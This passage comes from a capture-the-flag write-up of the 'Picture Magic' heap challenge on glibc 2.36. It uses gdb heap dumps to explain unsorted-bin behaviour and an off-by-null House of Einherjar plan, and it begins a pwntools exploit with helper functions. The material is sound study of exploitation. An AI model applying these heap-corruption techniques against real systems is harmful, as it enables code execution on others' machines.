+</code></pre></div><h2 id="exploit-strategy">Exploit strategy</h2><p>In order to plan the exploit strategy, we must take into account that the binary uses Glibc 2.36 (it is provided in the challenge):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./ld-2.36.so</span> <span class="mtku">./libc.so.6</span>
+GNU C Library (Ubuntu GLIBC 2.36-0ubuntu4) stable release version 2.36.  
+Copyright (C) 2022 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.
+There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
+PARTICULAR PURPOSE.
+Compiled by GNU CC version 12.2.0.
+libc ABIs: UNIQUE IFUNC ABSOLUTE
+Minimum supported kernel: 3.2.0
+For bug reporting instructions, please see:
+&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
+</code></pre></div><p>This is a modern Glibc version, so it has a lot of exploits patched. Still, we can take a look at <a target="_blank" href="https://github.com/shellphish/how2heap/tree/master/glibc_2.36">how2heap</a> and see that there are some exploits that work, altough there are some bypasses needed.</p><h3 id="unsorted-bin">Unsorted Bin</h3><p>In this challenge, we can only allocate chunks with <code>malloc(0x4f8)</code>. So, we don&rsquo;t have any control over the size of the chunks. Moreover, when these chunks are freed, they go directly into the Unsorted Bin, because their size is bigger than the one accepted by Tcache. For example:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">picture_magic</span>
+Reading symbols from <span class="code-dark-green">picture_magic</span>...
+(No debugging symbols found in <span class="code-dark-green">picture_magic</span>)
+<span class="code-red">gef&gt; </span>run
+Starting program: <span class="code-dark-green">./picture_magic</span>
+warning: Expected absolute pathname for libpthread in the inferior, but got <span class="code-dark-green">./libc.so.6</span>.
+warning: Unable to find libthread_db matching inferior's thread library, thread debugging will not be available.
+Welcome to...
+
+ ██████╗ ██╗ ██████╗████████╗██╗   ██╗██████╗ ███████╗    ███╗   ███╗ █████╗  ██████╗ ██╗ ██████╗██╗
+ ██╔══██╗██║██╔════╝╚══██╔══╝██║   ██║██╔══██╗██╔════╝    ████╗ ████║██╔══██╗██╔════╝ ██║██╔════╝██║
+ ██████╔╝██║██║        ██║   ██║   ██║██████╔╝█████╗      ██╔████╔██║███████║██║  ███╗██║██║     ██║
+ ██╔═══╝ ██║██║        ██║   ██║   ██║██╔══██╗██╔══╝      ██║╚██╔╝██║██╔══██║██║   ██║██║██║     ╚═╝
+ ██║     ██║╚██████╗   ██║   ╚██████╔╝██║  ██║███████╗    ██║ ╚═╝ ██║██║  ██║╚██████╔╝██║╚██████╗██╗
+ ╚═╝     ╚═╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚═════╝╚═╝
+
+Your all-in-one tool for creating, viewing, modifying and selling digital pictures on the internet. Let your creativity overflow!  
+
+Before creating your masterpiece, please enter your artist name: asdf
+
++------------------------------+
+|         Picture Magic        |
++------------------------------+
+| 1. Create picture            |
+| 2. Transform picture         |
+| 3. Show picture              |
+| 4. Sell picture              |
+| 5. Change artist name        |
+| 6. Exit                      |
++------------------------------+
+-&gt; 1
+
+Width: 0
+Height: 0
+
+Reading picture into buffer:
+================================
+================================
+Successfully read picture!
+Picture has been assigned index 0.
+
++------------------------------+
+|         Picture Magic        |
++------------------------------+
+| 1. Create picture            |
+| 2. Transform picture         |
+| 3. Show picture              |
+| 4. Sell picture              |
+| 5. Change artist name        |
+| 6. Exit                      |
++------------------------------+
+-&gt; 1
+
+Width: 0
+Height: 0
+
+Reading picture into buffer:
+================================
+================================
+Successfully read picture!
+Picture has been assigned index 1.
+
++------------------------------+
+|         Picture Magic        |
++------------------------------+
+| 1. Create picture            |
+| 2. Transform picture         |
+| 3. Show picture              |
+| 4. Sell picture              |
+| 5. Change artist name        |
+| 6. Exit                      |
++------------------------------+
+-&gt; 4
+
+Picture index: 0
+
+================================
+================================
+
+How much do you want to sell the picture for? 0
+You toss the picture away.
+
++------------------------------+
+|         Picture Magic        |
++------------------------------+
+| 1. Create picture            |
+| 2. Transform picture         |
+| 3. Show picture              |
+| 4. Sell picture              |
+| 5. Change artist name        |
+| 6. Exit                      |
++------------------------------+
+-&gt; ^C
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>heap chunks
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c000</span>, size=<span class="code-magenta">0x290</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x00055555555c, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c290</span>, size=<span class="code-magenta">0x500</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-green">0x7ffff7df6cc0</span>, bk=<span class="code-dark-green">0x7ffff7df6cc0</span>)<span class="code-blue">  &lt;-  unsortedbins[1/1]</span>
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c790</span>, size=<span class="code-magenta">0x500</span>, flags=, fd=0x00055555555c, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555cc90</span>, size=<span class="code-magenta">0x20370</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x00055555555c, bk=0x000000000000) <span class="code-blue"> &lt;-  top</span>
+<span class="code-green">gef&gt; </span>bins
+<span class="code-dark-cyan">----------------------------------------------------------------------------------------------------------------------------- Tcachebins for arena 'main_arena' -----------------------------------------------------------------------------------------------------------------------------</span>  
+<span class="code-blue">[+]</span> Found 0 chunks in tcache.
+<span class="code-dark-cyan">------------------------------------------------------------------------------------------------------------------------------ Fastbins for arena 'main_arena' ------------------------------------------------------------------------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in fastbin.
+<span class="code-dark-cyan">---------------------------------------------------------------------------------------------------------------------------- Unsorted Bin for arena 'main_arena' ----------------------------------------------------------------------------------------------------------------------------</span>
+unsorted_bins[idx=0, size=any, @<span class="code-dark-green">0x7ffff7df6cd0</span>]: fd=<span class="code-dark-blue">0x55555555c290</span>, bk=<span class="code-dark-blue">0x55555555c290</span>
+ -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c290</span>, size=<span class="code-magenta">0x500</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-green">0x7ffff7df6cc0</span>, bk=<span class="code-dark-green">0x7ffff7df6cc0</span>)
+<span class="code-blue">[+]</span> Found 1 chunks in unsorted bin.
+<span class="code-dark-cyan">----------------------------------------------------------------------------------------------------------------------------- Small Bins for arena 'main_arena' -----------------------------------------------------------------------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in 0 small non-empty bins.
+<span class="code-dark-cyan">----------------------------------------------------------------------------------------------------------------------------- Large Bins for arena 'main_arena' -----------------------------------------------------------------------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in 0 large non-empty bins.
+</code></pre></div><p>These freed chunks hold two addresses to Glibc (<code>main_arena</code>) in pointers <code>fd</code> and <code>bk</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>visual-heap
+<span class="code-dark-red">0x55555555c000: 0x0000000000000000 0x0000000000000291 | ................ |</span>
+<span class="code-dark-red">0x55555555c010: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-red">* 39 lines, 0x270 bytes</span>
+<span class="code-dark-green">0x55555555c290: 0x0000000000000000 0x0000000000000501 | ................ |  &lt;-  unsortedbins[1/1]</span>  
+<span class="code-dark-green">0x55555555c2a0: 0x00007ffff7df6cc0 0x00007ffff7df6cc0 | .l.......l...... |</span>
+<span class="code-dark-green">0x55555555c2b0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-green">* 77 lines, 0x4d0 bytes</span>
+<span class="code-dark-blue">0x55555555c790: 0x0000000000000500 0x0000000000000500 | ................ |</span>
+<span class="code-dark-blue">0x55555555c7a0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-blue">* 78 lines, 0x4e0 bytes</span>
+<span class="code-dark-yellow">0x55555555cc90: 0x0000000000000000 0x0000000000020371 | ........q....... |  &lt;-  top</span>
+<span class="code-dark-yellow">0x55555555cca0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-yellow">* 8245 lines, 0x20350 bytes</span>
+<span class="code-green">gef&gt; </span>x/gx 0x00007ffff7df6cc0
+<span class="code-dark-blue">0x7ffff7df6cc0</span> &lt;<span class="code-dark-yellow">main_arena</span>+96&gt;: 0x000055555555cc90
+</code></pre></div><p>Moreover, the next chunk&rsquo;s <code>PREV_INUSE</code> flag is updated to <code>0</code>, and the <code>prev_size</code> field is filled with <code>0x500</code>. This is important because the heap allocator will try to consolidate Unsorted Bin chunks between each other or with the top chunk when possible. For instance, if I free the second picture, all the heap will be consolidated with the top chunk:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>continue
+Continuing.
+4
+
+Picture index: 1
+
+================================
+================================
+
+How much do you want to sell the picture for? 0  
+You toss the picture away.
+
++------------------------------+
+|         Picture Magic        |
++------------------------------+
+| 1. Create picture            |
+| 2. Transform picture         |
+| 3. Show picture              |
+| 4. Sell picture              |
+| 5. Change artist name        |
+| 6. Exit                      |
++------------------------------+
+-&gt; ^C
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>chunks
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c000</span>, size=<span class="code-magenta">0x290</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x00055555555c, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c290</span>, size=<span class="code-magenta">0x20d70</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-green">0x7ffff7df6cc0</span>, bk=<span class="code-dark-green">0x7ffff7df6cc0</span>) <span class="code-blue"> &lt;-  top</span>
+<span class="code-green">gef&gt; </span>bins
+<span class="code-dark-cyan">------------------------------------------------------------- Tcachebins for arena 'main_arena' -------------------------------------------------------------</span>  
+<span class="code-blue">[+]</span> Found 0 chunks in tcache.
+<span class="code-dark-cyan">-------------------------------------------------------------- Fastbins for arena 'main_arena' --------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in fastbin.
+<span class="code-dark-cyan">------------------------------------------------------------ Unsorted Bin for arena 'main_arena' ------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in unsorted bin.
+<span class="code-dark-cyan">------------------------------------------------------------- Small Bins for arena 'main_arena' -------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in 0 small non-empty bins.
+<span class="code-dark-cyan">------------------------------------------------------------- Large Bins for arena 'main_arena' -------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in 0 large non-empty bins.
+<span class="code-green">gef&gt; </span>visual-heap
+<span class="code-dark-red">0x55555555c000: 0x0000000000000000 0x0000000000000291 | ................ |</span>
+<span class="code-dark-red">0x55555555c010: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-red">* 39 lines, 0x270 bytes</span>
+<span class="code-dark-green">0x55555555c290: 0x0000000000000000 0x0000000000020d71 | ........q....... |  &lt;-  top</span>
+<span class="code-dark-green">0x55555555c2a0: 0x00007ffff7df6cc0 0x00007ffff7df6cc0 | .l.......l...... |</span>
+<span class="code-dark-green">0x55555555c2b0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-green">* 77 lines, 0x4d0 bytes</span>
+<span class="code-dark-green">0x55555555c790: 0x0000000000000500 0x0000000000000500 | ................ |</span>
+<span class="code-white">...</span>
+</code></pre></div><p>Notice that the data inside the chunks is not removed&mldr;</p><p>There is also a way to &ldquo;sort&rdquo; an Unsorted Bin chunk into Large Bin. We can do it by calling <code>malloc_consolidate</code>, and this function is called by <code>scanf</code> if it has to process a long string. Let&rsquo;s see an example (starting as before):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>chunks
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c000</span>, size=<span class="code-magenta">0x290</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x00055555555c, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c290</span>, size=<span class="code-magenta">0x500</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-green">0x7ffff7df6cc0</span>, bk=<span class="code-dark-green">0x7ffff7df6cc0</span>)<span class="code-blue">  &lt;-  unsortedbins[1/1]</span>
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c790</span>, size=<span class="code-magenta">0x500</span>, flags=, fd=0x00055555555c, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555cc90</span>, size=<span class="code-magenta">0x20370</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x00055555555c, bk=0x000000000000) <span class="code-blue"> &lt;-  top</span>
+<span class="code-green">gef&gt; </span>bins
+<span class="code-dark-cyan">------------------------------------------------------------- Tcachebins for arena 'main_arena' -------------------------------------------------------------</span>  
+<span class="code-blue">[+]</span> Found 0 chunks in tcache.
+<span class="code-dark-cyan">-------------------------------------------------------------- Fastbins for arena 'main_arena' --------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in fastbin.
+<span class="code-dark-cyan">------------------------------------------------------------ Unsorted Bin for arena 'main_arena' ------------------------------------------------------------</span>
+unsorted_bins[idx=0, size=any, @<span class="code-dark-green">0x7ffff7df6cd0</span>]: fd=<span class="code-dark-blue">0x55555555c290</span>, bk=<span class="code-dark-blue">0x55555555c290</span>
+ -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c290</span>, size=<span class="code-magenta">0x500</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-green">0x7ffff7df6cc0</span>, bk=<span class="code-dark-green">0x7ffff7df6cc0</span>)
+<span class="code-blue">[+]</span> Found 1 chunks in unsorted bin.
+<span class="code-dark-cyan">------------------------------------------------------------- Small Bins for arena 'main_arena' -------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in 0 small non-empty bins.
+<span class="code-dark-cyan">------------------------------------------------------------- Large Bins for arena 'main_arena' -------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in 0 large non-empty bins.
+</code></pre></div><p>Now we enter a large string (more than 1024 bytes):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>continue
+Continuing.
+00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000  
+
+Invalid choice!
+
++------------------------------+
+|         Picture Magic        |
++------------------------------+
+| 1. Create picture            |
+| 2. Transform picture         |
+| 3. Show picture              |
+| 4. Sell picture              |
+| 5. Change artist name        |
+| 6. Exit                      |
++------------------------------+
+-&gt; ^C
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>chunks
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c000</span>, size=<span class="code-magenta">0x290</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x00055555555c, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c290</span>, size=<span class="code-magenta">0x500</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-green">0x7ffff7df70f0</span>, bk=<span class="code-dark-green">0x7ffff7df70f0</span>, fd_nextsize=<span class="code-dark-blue">0x55555555c290</span>, bk_nextsize=<span class="code-dark-blue">0x55555555c290</span>)<span class="code-blue">  &lt;-  largebins[idx=67,sz=0x500-0x540][1/1]</span>  
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c790</span>, size=<span class="code-magenta">0x500</span>, flags=, fd=0x00055555555c, bk=0x000000000000)
+<span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555cc90</span>, size=<span class="code-magenta">0x20370</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x303030356565656c, bk=0x3030303030303030) <span class="code-blue"> &lt;-  top</span>
+<span class="code-green">gef&gt; </span>bins
+<span class="code-dark-cyan">------------------------------------------------------------- Tcachebins for arena 'main_arena' -------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in tcache.
+<span class="code-dark-cyan">-------------------------------------------------------------- Fastbins for arena 'main_arena' --------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in fastbin.
+<span class="code-dark-cyan">------------------------------------------------------------ Unsorted Bin for arena 'main_arena' ------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in unsorted bin.
+<span class="code-dark-cyan">------------------------------------------------------------- Small Bins for arena 'main_arena' -------------------------------------------------------------</span>
+<span class="code-blue">[+]</span> Found 0 chunks in 0 small non-empty bins.
+<span class="code-dark-cyan">------------------------------------------------------------- Large Bins for arena 'main_arena' -------------------------------------------------------------</span>
+large_bins[idx=67, size=0x500-0x540, @<span class="code-dark-green">0x7ffff7df7100</span>]: fd=<span class="code-dark-blue">0x55555555c290</span>, bk=<span class="code-dark-blue">0x55555555c290</span>
+ -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x55555555c290</span>, size=<span class="code-magenta">0x500</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-green">0x7ffff7df70f0</span>, bk=<span class="code-dark-green">0x7ffff7df70f0</span>, fd_nextsize=<span class="code-dark-blue">0x55555555c290</span>, bk_nextsize=<span class="code-dark-blue">0x55555555c290</span>)
+<span class="code-blue">[+]</span> Found 1 chunks in 1 large non-empty bins.
+<span class="code-green">gef&gt; </span>visual-heap
+<span class="code-dark-red">0x55555555c000: 0x0000000000000000 0x0000000000000291 | ................ |</span>
+<span class="code-dark-red">0x55555555c010: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-red">* 39 lines, 0x270 bytes</span>
+<span class="code-dark-green">0x55555555c290: 0x0000000000000000 0x0000000000000501 | ................ |  &lt;-  largebins[idx=67,sz=0x500-0x540][1/1]</span>
+<span class="code-dark-green">0x55555555c2a0: 0x00007ffff7df70f0 0x00007ffff7df70f0 | .p.......p...... |</span>
+<span class="code-dark-green">0x55555555c2b0: 0x000055555555c290 0x000055555555c290 | ..UUUU....UUUU.. |</span>
+<span class="code-dark-green">0x55555555c2c0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-green">* 76 lines, 0x4c0 bytes</span>
+<span class="code-dark-blue">0x55555555c790: 0x0000000000000500 0x0000000000000500 | ................ |</span>
+<span class="code-dark-blue">0x55555555c7a0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-blue">* 78 lines, 0x4e0 bytes</span>
+<span class="code-dark-yellow">0x55555555cc90: 0x0000000000000000 0x0000000000020371 | ........q....... |  &lt;-  top</span>
+<span class="code-dark-yellow">0x55555555cca0: 0x3030303030303030 0x3030303030303030 | 0000000000000000 |</span>
+<span class="code-dark-yellow">* 175 lines, 0xaf0 bytes</span>
+<span class="code-dark-yellow">0x55555555d7a0: 0x0000000000000000 0x0000000000000000 | ................ |</span>
+<span class="code-dark-yellow">* 79 lines, 0x4f0 bytes</span>
+<span class="code-dark-yellow">0x55555555dca0: 0x0000000000000000 0x000000000001f361 | ........a....... |</span>
+<span class="code-white">...</span>
+</code></pre></div><p>This ability is not actually needed in the exploit, but it is worth to have it documented.</p><h3 id="house-of-einherjar-null-byte-poison">House of Einherjar (Null-byte poison)</h3><p>Remember from <code>read_picture</code> that we have an off-by-null vulnerability. In fact, we can exploit it to modify the adjacent chunk&rsquo;s metadata (specifically, set <code>PREV_INUSE</code> to <code>0</code>).</p><p>This is the only bug we have. In an easier challenge, one could simply perform a null byte poisoning attack (like in <a target="_blank" href="../dream-diary-chapter-3">Dream Diary: Chapter 3</a>) and finish. Nevertheless, this program does not allow us to write null bytes where we want. For instance, we will need to play with the <code>prev_size</code> field in order to exploit a kind of Unsafe Unlink exploit, but we can&rsquo;t simply add <code>0x0000000000000500</code>, because all null bytes will be replaced by white spaces.</p><p>At this point, the only thing I could think is to use negative integers, because they are expressed using the <a target="_blank" href="https://en.wikipedia.org/wiki/Two%27s_complement">two&rsquo;s complement</a>, so for example, <code>-1</code> will be <code>0xffffffffffffffff</code>. This way, we can enter any negative <code>prev_size</code> and still try to perform a null byte poisoning attack.</p><p>The best idea is to use the <code>name</code> buffer on the stack to write our fake chunk, since here we don&rsquo;t have any bad characters limitation. Therefore, we also need to get a heap address leak in order to compute relative offsets (for negative <code>prev_size</code>).</p><h2 id="exploit-development">Exploit development</h2><p>First of all, we will use these helper functions:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk9 mtki">width</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">height</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">data</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">''</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">int</span><span class="mtk1">:</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'-&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Width: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">width</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Height: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">height</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'================================</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk9 mtki">data</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Picture has been assigned index '</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'.'</span><span class="mtk1">, </span><span class="mtk9 mtki">drop</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">).</span><span class="mtk8">decode</span><span class="mtk1">())</span>
+
+
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">transform</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">size</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">row</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">column</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">operation</span><span class="mtk1">: </span><span class="mtk8 mtku">bytes</span><span class="mtk1">):</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'-&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Picture index: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Transformation type (mul/add/sub/div): '</span><span class="mtk1">, </span><span class="mtk9 mtki">operation</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Transformation size: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">size</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Transformation row (-1 for all): '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">row</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Transformation column (-1 for all): '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">column</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>  
+
+
